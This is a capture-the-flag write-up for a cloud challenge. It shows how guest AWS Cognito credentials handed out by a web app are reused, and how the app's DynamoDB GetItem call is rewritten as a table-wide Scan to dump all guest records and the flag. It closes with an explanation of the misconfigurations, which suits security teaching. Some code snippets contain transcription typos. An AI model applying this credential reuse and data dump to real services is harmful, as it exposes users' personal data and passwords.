# Title: Complimentary

#### Category: Easy

#### Description: 
Install the free app and it hands your phone a set of cloud keys, the same set it hands everyone. They're read-only, but read-
only of every guest's contacts, location, and passwords, not just Lambo's. She gave consent. Technically.

---

## Task 1: Hacker Holidays: Day 3

<img width="805" height="722" alt="image" src="https://github.com/user-attachments/assets/f12b1312-5a52-490d-82c6-554464194dde" />

<img width="805" height="636" alt="image" src="https://github.com/user-attachments/assets/59d8328a-180f-4f5a-b744-372264d5a28e" />


#### Analysis: 

The challenge immediately suggests a cloud security issue. Several clues point toward an application that grants access to cloud resources without requiring authentication.

Notable clues include:

- The application is free and requires no account or login.
- It requests access to sensitive device permissions such as contacts, location, microphone, and camera.
- Every visitor automatically receives access without authentication.

Normally, applications should authenticate users before granting access to cloud resources. If every visitor receives the same credentials, there is a risk that anyone can access data belonging to other users.

The objective is to determine how the application authenticates users and whether those credentials can be abused.


---

### Methodology

#### Step 1: Access the Web Application
Navigate to the application.
```http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com```


<img width="1882" height="596" alt="image" src="https://github.com/user-attachments/assets/ce5fdae5-e093-4eb9-9c5d-d8f6a302da38" />

Observation:

There is no authentication process.

This is suspicious because the application still displays personalized information despite having no user account.


#### Step 2: Inspect the Client-Side Source Code

View the page source and identify the JavaScript responsible for the application's functionality.

Among the loaded files is:
> app.js

<img width="1121" height="568" alt="image" src="https://github.com/user-attachments/assets/24ad8625-5911-47a3-925a-1a68a763dd15" />

Since modern web applications often contain API calls and cloud configuration inside JavaScript, this is the logical place to begin analysis.

#### Step 3: Analyze app.js

```
// Byte Lotus Wellness a€" guest dashboard
//
// No login screen on purpose: every visitor gets "free" AWS guest
// credentials from our Cognito Identity Pool so we can save wellness
// preferences without the friction of an account.

const IDENTITY POOL ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS REGION = "us-east-1";
const TABLE NAME = "complimentary-GuestWellnessProfiles";

AWS. config.region = AWS REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY POOL ID,
});

function guestId() {
  let id = localStorage.getItem("byteLotusGuestId");
  if (!id) {
    // First visit: hand out a throwaway guest id, same as checking in.
    id = "guest-" + Math.random().toString(36).slice(2, 10);
    localStorage.setItem("byteLotusGuestId", id);
  }
  return id;
}

function renderDashboard(item) {
  const el = document.getElementById("dashboard");
  if (!item) {
    el.textContent = "Welcome! We don't have wellness data for you yet a€" check back after your first spa visit.";
    return;
  }
  el.textContent = [
    "Name: " + (item. name ? item. name.S : "a€""),
    'Loyalty notes: " + (item.notes ? item.notes.S : "a€""),
  ].join("\n");
}
AWS. config.credentials.get(function (err) {
  if (err) {
    console.error("Could not fetch guest credentials:", err);
    return;
  }
  const dynamodb = new AWS.DynamoDB({ region: AWS_REGION });
  dynamodb.getItem(
    {
      TableName: TABLE NAME,
      Key: { guest_id: { S: guestId() } },
    },
    function (err, data) {
      if (err) {
        console.error("Could not load dashboard:", err);
        return;
      }
      renderDashboard (data. Item) ;
    }
  );
});

```

Opening app.js reveals several important configuration values.

```
const IDENTITY POOL ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS REGION = "us-east-1";
const TABLE NAME = "complimentary-GuestWellnessProfiles";
```

Why is this important?

These values reveal that the application uses:

- Amazon Cognito Identity Pool for guest authentication
- Amazon DynamoDB as its backend database

The application automatically retrieves temporary AWS credentials for every visitor through Cognito.


#### Step 4: Identify How Data Is Retrieved

Further down in the code, the application retrieves guest data.

```
AWS. config.credentials.get(function (err) {
  if (err) {
    console.error("Could not fetch guest credentials:", err);
    return;
  }
  const dynamodb = new AWS.DynamoDB({ region: AWS_REGION });
  dynamodb. getItem(
    {
      TableName: TABLE NAME,
      Key: { guest_id: { S: guestId() } },
    },
    function (err, data) {
      if (err) {
        console.error("Could not load dashboard:", err);
        return;
      }
      renderDashboard (data. Item) ;
    }
  );
});

```

What is happening?

After obtaining temporary AWS credentials, the application performs a GetItem request against the DynamoDB table.

It retrieves only one record, using the current user's randomly generated guest ID.

This behavior prevents users from seeing other guest profiles—at least through the intended interface.

Although the application only requests a single record, the temporary AWS credentials are available inside the browser.

This means we can reuse those credentials ourselves.


#### Step 5: Modify the JavaScript Request

Instead of retrieving a single record with GetItem, replace it with a Scan operation.


```
AWS. config.credentials.get(function (err) {
  if (err) {
    console.error("Could not fetch guest credentials:", err);
    return;
  }
  const dynamodb = new AWS.DynamoDB({ region: "us-east-1" });
  dynamodb.scan(
    {
      TableName: "complimentary-GuestWellnessProfiles"
    },
    function (err, data) {
      if (err) {
        console.error("Could not load dashboard:", err);
        return;
      }
      console.log(data.Items);
    }
  );
});
```

1. Replace the region with an actual value: "us-east-1"

2. "dynamodb. getItem" to "dynamodb. scan"

3. Replace the table name with an actual value: "complimentary-GuestWellnessProfiles"

4. Remove this: ", Key: { guest_id: { S: guestId() } };"

5. "renderDashboard (data. Item);" to "console.log(data.Items);"


#### Step 6: Execute the Modified Code

Run the modified script in the browser console.

The Scan request successfully returns every guest profile stored in the DynamoDB table.

Among the returned records are:
```
Guest names
Email addresses
Phone numbers
Locations
Passwords
Personal notes
```
One of the guest records also contains the challenge flag inside the notes field.

<img width="1656" height="732" alt="image" src="https://github.com/user-attachments/assets/93530209-d298-4354-807b-e6e444200e6d" />


---

### Today's Itinerary 

1. Track down the AWS mechanism issuing you credentials behind the scenes

> By inspecting app.js, we discovered that the application uses Amazon Cognito Identity Pools to automatically issue temporary AWS credentials to every visitor. These credentials are obtained without requiring authentication or a user account.

2. Use those credentials to dump more than your own record from the app's DynamoDB table

> The application normally retrieves only the current guest's record using DynamoDB GetItem(). By modifying the client-side JavaScript to use DynamoDB Scan() instead, we reused the same guest credentials to enumerate every record stored in the table.

3. Retrieve the flag from another guest's data 

> The Scan operation exposed all guest profiles. Inspecting the returned records revealed another guest's notes containing the challenge flag.

---

### Flag: 
THM{fr33_app_fr33_d4t4!}

This challenge demonstrates several common cloud security misconfigurations.

Overly permissive AWS Cognito Identity Pools allowed every visitor to obtain valid cloud credentials without authentication.
Excessive IAM permissions granted guest users the ability to perform a table-wide Scan operation instead of restricting them to their own records.
Client-side trust exposed AWS configuration details and relied on the browser to enforce access restrictions, which can easily be bypassed.
Sensitive data exposure resulted from storing confidential guest information in a database that was accessible through overly broad read permissions.

The intended design was for guests to retrieve only their own wellness profile. However, because the backend relied on weak IAM policies rather than enforcing proper server-side authorization, an attacker could enumerate every guest record and retrieve sensitive information, including the challenge flag.



